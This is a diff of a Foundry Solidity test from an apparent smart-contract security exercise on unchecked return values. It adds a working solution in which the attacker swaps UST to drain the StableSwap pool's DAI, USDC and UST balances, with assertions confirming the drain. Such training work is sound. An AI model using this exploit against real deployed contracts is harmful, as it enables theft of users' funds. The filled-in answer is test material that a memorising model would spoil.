@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "src/unchecked-returns-3/DAI.sol";
 import "src/unchecked-returns-3/StableSwap.sol";
+import "src/unchecked-returns-3/StableSwapSecured.sol";
 import "src/unchecked-returns-3/USDC.sol";
 import "src/unchecked-returns-3/UST.sol";
 
@@ -12,11 +13,10 @@ import "src/unchecked-returns-3/UST.sol";
  * @dev run "forge test -vvv --match-contract UR3"
  */
 contract TestUR3 is Test {
-    
     uint256 constant TOKENS_INITIAL_SUPPLY = 100_000_000 ether;
     uint256 constant TOKENS_IN_STABLESWAP = 1_000_000 ether;
     uint256 constant CHAIN_ID = 31337;
-    
+
     address deployer = makeAddr("deployer");
     address attacker = makeAddr("attacker");
 
@@ -89,11 +89,20 @@ contract TestUR3 is Test {
     }
 
     function testAttackStableSwap() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
 
-        /** SUCCESS CONDITIONS */
+        /**
+         * SUCCESS CONDITIONS
+         */
+        vm.startPrank(attacker);
+        // usdc.approve(address(stableSwap), 100 ether);
+        stableSwap.swap(address(ust), address(dai), dai.balanceOf(address(stableSwap)));
+        stableSwap.swap(address(ust), address(usdc), usdc.balanceOf(address(stableSwap)));
+        stableSwap.swap(address(ust), address(ust), ust.balanceOf(address(stableSwap)));
 
-		// Attacker was able to drain the entire protocol balance!
+        // // Attacker was able to drain the entire protocol balance!
         assertEq(usdc.balanceOf(address(stableSwap)), 0);
         assertEq(dai.balanceOf(address(stableSwap)), 0);
         assertEq(ust.balanceOf(address(stableSwap)), 0);
@@ -102,5 +111,4 @@ contract TestUR3 is Test {
         assertEq(dai.balanceOf(address(attacker)), stableSwapDAIBalance);
         assertEq(ust.balanceOf(address(attacker)), stableSwapUSTBalance);
     }
-
 }
